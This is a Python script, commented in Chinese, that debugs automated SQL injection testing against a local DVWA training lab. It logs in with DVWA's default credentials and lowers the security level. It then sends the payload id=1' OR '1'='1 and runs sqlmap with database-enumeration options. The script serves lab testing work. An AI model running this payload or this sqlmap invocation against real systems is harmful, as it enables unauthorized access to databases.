#!/usr/bin/env python3
"""
调试SQLMap DVWA测试
输出详细信息，分析检测失败原因
"""

import os
import sys
import subprocess
import time
import re
import requests

def get_dvwa_cookie():
    """获取DVWA cookie"""
    dvwa_url = "http://127.0.0.1/dvwa"
    login_url = f"{dvwa_url}/login.php"

    session = requests.Session()

    try:
        # 获取登录页面
        response = session.get(login_url)

        # 提取token
        token_match = re.search(r'name="user_token" value="([^"]+)"', response.text)

        # 登录数据
        login_data = {
            'username': 'admin',
            'password': 'password',
            'Login': 'Login'
        }

        if token_match:
            login_data['user_token'] = token_match.group(1)

        # 提交登录
        response = session.post(login_url, data=login_data)

        if 'Login failed' not in response.text:
            print("✅ DVWA登录成功")

            # 设置安全级别为low
            security_url = f"{dvwa_url}/security.php"

            # 获取安全页面token
            response = session.get(security_url)
            token_match = re.search(r'name="user_token" value="([^"]+)"', response.text)

            security_data = {
                'security': 'low',
                'seclev_submit': 'Submit'
            }

            if token_match:
                security_data['user_token'] = token_match.group(1)

            session.post(security_url, data=security_data)
            print("✅ 设置安全级别为low")

            # 获取cookie
            cookie = session.cookies.get('PHPSESSID')
            return cookie, session

        else:
            print("❌ DVWA登录失败")
            return None, None

    except Exception as e:
        print(f"❌ 连接DVWA失败: {e}")
        return None, None

def test_dvwa_sqli_manually(session):
    """手动测试DVWA SQL注入页面"""
    dvwa_url = "http://127.0.0.1/dvwa"
    sqli_url = f"{dvwa_url}/vulnerabilities/sqli/"

    print(f"\n🔍 手动测试SQL注入页面: {sqli_url}")

    # 访问页面
    response = session.get(sqli_url)
    print(f"   状态码: {response.status_code}")
    print(f"   页面大小: {len(response.text)} 字节")

    # 检查页面内容
    content = response.text.lower()

    # 查找关键信息
    if 'sql' in content and 'injection' in content:
        print("   ✅ 页面包含SQL注入相关文本")

    if 'user id' in content:
        print("   ✅ 找到'User ID'字段")

    if 'submit' in content:
        print("   ✅ 找到'Submit'按钮")

    # 查找表单和参数
    forms = re.findall(r'<form[^>]*>.*?</form>', response.text, re.DOTALL | re.IGNORECASE)
    print(f"   找到 {len(forms)} 个表单")

    for i, form in enumerate(forms):
        # 查找action
        action_match = re.search(r'action="([^"]*)"', form, re.IGNORECASE)
        action = action_match.group(1) if action_match else 'N/A'

        # 查找method
        method_match = re.search(r'method="([^"]*)"', form, re.IGNORECASE)
        method = method_match.group(1).upper() if method_match else 'GET'

        print(f"\n   表单 #{i+1}:")
        print(f"     Action: {action}")
        print(f"     Method: {method}")

        # 查找输入字段
        inputs = re.findall(r'<input[^>]*>', form, re.IGNORECASE)
        for inp in inputs:
            name_match = re.search(r'name="([^"]*)"', inp, re.IGNORECASE)
            type_match = re.search(r'type="([^"]*)"', inp, re.IGNORECASE)
            value_match = re.search(r'value="([^"]*)"', inp, re.IGNORECASE)

            name = name_match.group(1) if name_match else 'N/A'
            type_ = type_match.group(1) if type_match else 'text'
            value = value_match.group(1) if value_match else ''

            print(f"       输入: name='{name}', type='{type_}', value='{value}'")

    # 测试实际请求
    print(f"\n🧪 测试实际请求...")

    # 测试1: 使用id参数
    test_url1 = f"{sqli_url}?id=1&Submit=Submit"
    response1 = session.get(test_url1)
    print(f"   测试URL1: {test_url1}")
    print(f"   状态码: {response1.status_code}")
    print(f"   响应大小: {len(response1.text)} 字节")

    # 检查响应内容
    resp_text1 = response1.text.lower()
    if 'first name' in resp_text1 or 'surname' in resp_text1:
        print("   ✅ 响应包含用户数据（可能存在SQL注入）")
    else:
        print("   ❌ 响应未包含用户数据")
        # 输出部分响应内容分析
        lines = response1.text.split('\n')
        for line in lines[:10]:
            if line.strip():
                print(f"       {line[:100]}...")

    # 测试2: 尝试SQL注入payload
    test_url2 = f"{sqli_url}?id=1' OR '1'='1&Submit=Submit"
    response2 = session.get(test_url2)
    print(f"\n   测试URL2 (SQL注入payload): {test_url2}")
    print(f"   状态码: {response2.status_code}")

    # 比较两个响应
    if response1.text != response2.text:
        print("   ✅ 响应不同（可能存在SQL注入漏洞）")
    else:
        print("   ❌ 响应相同（可能没有SQL注入）")

    return test_url1

def run_sqlmap_with_debug(target_url, cookie):
    """运行SQLMap并输出调试信息"""
    sqlmap_path = r"C:\Users\67096\AppData\Local\Python\pythoncore-3.14-64\Scripts\sqlmap.exe"

    if not os.path.exists(sqlmap_path):
        print(f"❌ SQLMap未找到: {sqlmap_path}")
        return

    print(f"\n🚀 运行SQLMap进行调试...")
    print(f"   目标URL: {target_url}")
    print(f"   Cookie: PHPSESSID={cookie[:10]}...")

    # 使用详细输出的命令
    cmd = [
        sqlmap_path,
        "-u", target_url,
        "--cookie", f"PHPSESSID={cookie}; security=low",
        "--batch",
        "--level", "3",
        "--risk", "2",
        "--technique", "BEUSTQ",
        "--dbms", "mysql",
        "--dbs",
        "--flush-session",
        "--output-dir", "reports/sqlmap_debug",
        "--threads", "3",
        "-v", "3"  # 详细输出级别
    ]

    print(f"\n💻 执行命令:")
    print(f"   {' '.join(cmd[:8])}...")

    # 创建输出目录
    os.makedirs("reports/sqlmap_debug", exist_ok=True)

    try:
        # 执行并实时输出
        start_time = time.time()
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            encoding='utf-8',
            errors='ignore'
        )

        print(f"\n📊 实时输出:")
        print("-" * 80)

        # 读取并实时显示输出
        output_lines = []
        while True:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break
            if line:
                output_lines.append(line)
                # 显示关键信息行
                if any(keyword in line.lower() for keyword in ['testing', 'injectable', 'vulnerable', 'parameter', 'database', 'error']):
                    print(f"   {line.rstrip()}")

        # 获取剩余输出
        stdout, stderr = process.communicate()
        output_lines.extend(stdout.split('\n'))

        elapsed_time = time.time() - start_time
        print("-" * 80)
        print(f"\n⏱️  执行时间: {elapsed_time:.1f}秒")
        print(f"📤 退出代码: {process.returncode}")

        # 分析输出
        print(f"\n🔍 输出分析:")
        output_text = '\n'.join(output_lines)

        # 检查关键信息
        if 'is vulnerable' in output_text:
            print("   ✅ SQLMap报告: 目标存在SQL注入漏洞")
        elif 'all tested parameters appear to be not injectable' in output_text:
            print("   ❌ SQLMap报告: 所有测试参数都不可注入")
        elif 'heuristic test' in output_text:
            print("   ⚠️  SQLMap报告: 进行了启发式测试")
        else:
            print("   ❓ SQLMap报告: 未找到明确结论")

        # 提取参数信息
        param_matches = re.findall(r'Testing for .*?parameter (.*?) ', output_text)
        if param_matches:
            print(f"   测试的参数: {', '.join(set(param_matches))}")

        # 提取数据库信息
        db_match = re.search(r'back-end DBMS: (.+)', output_text)
        if db_match:
            print(f"   数据库系统: {db_match.group(1)}")

        # 提取测试的技术
        tech_matches = re.findall(r'Testing for (.*?) on ', output_text)
        if tech_matches:
            print(f"   测试的技术: {', '.join(set(tech_matches))}")

        # 保存完整输出
        output_file = f"reports/sqlmap_debug_output_{int(time.time())}.txt"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(output_text)

        print(f"\n💾 完整输出已保存至: {output_file}")

        # 如果有错误输出
        if stderr:
            print(f"\n❌ 错误输出:")
            print(stderr[:500])

    except Exception as e:
        print(f"❌ 执行SQLMap时出错: {e}")

def main():
    """主函数"""
    print("=" * 80)
    print("SQLMap DVWA测试调试")
    print("=" * 80)

    # 1. 获取DVWA cookie
    print("\n1. 获取DVWA会话...")
    cookie, session = get_dvwa_cookie()

    if not cookie:
        print("❌ 无法获取DVWA会话")
        return

    print(f"✅ 获取到PHPSESSID: {cookie}")

    # 2. 手动测试SQL注入页面
    print("\n2. 分析DVWA SQL注入页面...")
    test_url = test_dvwa_sqli_manually(session)

    if not test_url:
        print("❌ 无法分析SQL注入页面")
        return

    # 3. 运行SQLMap调试
    print("\n3. 运行SQLMap调试...")
    run_sqlmap_with_debug(test_url, cookie)

    # 4. 问题诊断
    print("\n" + "="*80)
    print("4. 问题诊断和建议")
    print("="*80)

    print("\n🔧 可能的问题和解决方案:")
    print("""
    可能问题1: DVWA配置问题
       - 检查DVWA数据库连接是否正常
       - 确认安全级别已设置为'low'
       - 验证数据库用户是否有足够权限

    可能问题2: SQLMap参数问题
       - 尝试不同的注入技术（--technique B 只测试Boolean盲注）
       - 调整level和risk参数（--level 5 --risk 3）
       - 指定数据库类型（--dbms mysql）

    可能问题3: Cookie/Session问题
       - 验证Cookie是否包含正确的PHPSESSID
       - 确保security=low参数在Cookie中
       - 尝试不使用Cookie直接测试

    可能问题4: 目标URL格式
       - 尝试不同的URL格式和参数
       - 测试DVWA的其他SQL注入页面（盲注）
       - 检查是否有CSRF token等保护机制

    可能问题5: 网络/环境问题
       - 验证DVWA靶场可访问性
       - 检查防火墙/网络限制
       - 尝试在Docker容器中运行SQLMap
    """)

    # 5. 下一步建议
    print("\n🎯 下一步建议:")
    print("   1. 直接访问DVWA SQL注入页面，手动测试SQL注入")
    print("   2. 尝试其他SQL注入测试工具（如sqlsus、sqlninja）")
    print("   3. 测试DVWA的其他漏洞类型（XSS、命令注入等）")
    print("   4. 如果SQL注入确实无法检测，调整竞赛演示策略")
    print("   5. 准备备选测试环境和数据")

    print(f"\n✅ 调试完成。请检查输出文件获取详细信息。")

if __name__ == "__main__":
    main()